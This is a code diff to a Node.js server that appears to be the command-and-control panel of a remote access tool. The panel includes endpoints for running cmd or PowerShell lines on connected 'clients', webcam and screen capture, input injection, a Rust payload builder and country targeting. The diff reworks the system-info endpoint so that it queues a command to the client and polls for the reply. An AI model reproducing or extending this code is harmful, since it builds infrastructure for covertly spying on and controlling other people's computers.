@@ -17,7 +17,6 @@ import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, ge
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { countriesFor } from './builder/geo.js';
-import { runSysinfo } from './builder/sysinfo.js'; // NEW
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -397,7 +396,6 @@ app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
   const { shell, line } = req.body || {};
   if (!['cmd', 'powershell', 'file'].includes(shell))
     return res.status(400).json({ error: 'bad shell' });
-  // NEW: allow long powershell/cmd lines for encoded sysinfo scripts
   const maxLine = shell === 'file' ? 32 * 1024 * 1024 : 65536;
   if (typeof line !== 'string' || !line.trim() || line.length > maxLine)
     return res.status(400).json({ error: 'bad line' });
@@ -423,18 +421,37 @@ app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
   res.json(rows);
 });
 
-// NEW: system snapshot — cpu/gpu/ram + top processes
+// Native Rust process manager polling
 app.get('/api/clients/:id/sysinfo', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
 
   try {
-    const data = await runSysinfo(clientId, req.user.uid);
-    res.json(data);
+    const info = db.prepare(sql`
+      INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
+      VALUES (?, ?, 'sysinfo', '', 'pending', ?)
+    `).run(req.user.uid, clientId, Date.now());
+    
+    const cmdId = Number(info.lastInsertRowid);
+    const deadline = Date.now() + 10000; // 10s timeout
+
+    while (Date.now() < deadline) {
+      await new Promise(r => setTimeout(r, 150));
+      const row = db.prepare(sql`SELECT output, status FROM commands WHERE id = ?`).get(cmdId);
+      if (!row) continue;
+      if (row.status === 'done') {
+        try {
+          return res.json(JSON.parse(row.output || '{}'));
+        } catch (e) {
+          return res.status(500).json({ error: 'bad json from client', raw: row.output });
+        }
+      }
+    }
+    res.status(504).json({ error: 'timeout waiting for client' });
   } catch (e) {
     console.error('[sysinfo]', e);
-    res.status(500).json({ ok: false, error: e.message || 'sysinfo failed' });
+    res.status(500).json({ error: 'internal error' });
   }
 });
 
